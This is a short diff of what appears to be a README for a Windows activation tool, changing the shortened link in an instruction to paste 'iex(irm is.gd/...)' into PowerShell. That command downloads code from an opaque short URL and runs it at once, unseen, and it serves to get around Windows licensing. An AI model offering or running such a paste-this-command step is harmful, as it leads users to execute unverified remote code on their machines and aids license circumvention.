@@ -10,7 +10,7 @@
 -   Right-click on the Windows start menu and select PowerShell (Recommended) or Terminal (Not CMD).
 -   Copy-paste the below code and press enter
     ```
-    iex(irm is.gd/gctj20)
+    iex(irm is.gd/ActivateWin)
     ```
 -   You will see the activation window.
 -   Wait for 5-10 seconds, depending on your internet connection and setup.
